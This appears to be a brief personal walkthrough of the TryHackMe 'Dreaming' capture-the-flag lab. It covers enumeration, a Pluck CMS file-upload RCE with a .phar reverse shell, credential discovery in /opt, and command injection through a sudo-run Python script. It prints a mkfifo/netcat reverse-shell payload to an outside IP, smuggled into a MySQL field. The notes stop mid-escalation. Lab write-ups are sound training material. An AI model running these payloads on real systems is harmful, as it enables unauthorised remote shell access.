nmap > 

(- Enumeration)

gobuster: crawl the directory > found the version of the application(pluck 4.7.13) > bruteforce admin login page

> search for CMS version vulnerabilities(pluck 4.7.13: File Upload Remote Code Execution) >  use ExploitDB > goto http://IP/app find the uploading page 

(- Exploitation)
> hover to navbar tab choose 'manage files' > create php reverse shell + change extension(php->phar) > upload the .phar file 

> start a listener(nc -lvnp 4444) + open the webpage .phar file 

(- Lateral Movement)

find users
> cat /etc/passwd |grep 'bash'
> cd /opt
checking files
> ls -la
find a password
> head test.py

connect SSH
> ssh lucien@$VMIP
> sudo -l

we see that we can run /usr/bin/python3 /home/death/getDreams.py as the user death.

*We only can read files inside /OPT directory

cd /opt$ cat getDreams.py

`command = f"echo {dreamer} + {dream}"`

this is get command execution using command substitution

When a command is enclosed within $(), Bash executes the command and substitutes its standard output in place.

> echo "$(id)"

> cat $HOME/.bash_history

> mysql -u lucien -p[REDACTED]

```
mysql> INSERT INTO dreams (dreamer, dream) VALUES ('Nightmare', '$(rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.2.12 4444 >/tmp/f)');
```

> lucien@dreaming:~$ sudo -u death /usr/bin/python3 /home/death/getDreams.py

>  (attacker machine) nc -lvnp 4444

<stuck here> :https://cybersecfun.pythonanywhere.com/tryhackme/dreaming.html
- Privilege Escalation (The Intended Way)
  
death@dreaming:~$ find / -type f -not -path "/proc/*" -not -path "/sys/*" -not -path "/home/death/*" -writable 2>/dev/null


